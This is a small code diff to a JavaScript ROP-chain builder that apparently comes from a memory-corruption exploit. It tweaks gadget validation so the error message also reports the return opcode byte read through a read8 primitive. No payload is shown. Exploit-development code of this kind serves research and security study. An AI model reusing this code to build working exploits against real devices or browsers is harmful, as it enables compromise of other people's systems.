@@ -63,9 +63,10 @@ function RopChain() {
                 for(var i = 0; i < gadget.machine.length; i++){
                     if((tmp[tmp.length] = read8(gadget.addr().add(i))) != gadget.machine[i]) valid = false;
                 }
-                if(read8(gadget.addr().add(gadget.machine.length)) != 0xc3) valid = false;
+                var ret = read8(gadget.addr().add(gadget.machine.length));
+                if(ret != 0xc3) valid = false;
                 if(!valid){
-                  throw "Opcode invalid in "+instr+" got "+tmp.reduce(function(p,c){ return p+c.toString(16)+' '},"")
+                  throw "Opcode invalid in "+instr+" got "+tmp.reduce(function(p,c){ return p+c.toString(16)+' '},"")+ret.toString(16)
                 }
             }
             this.rop_chain.push(gadget.addr().getLowBitsUnsigned())
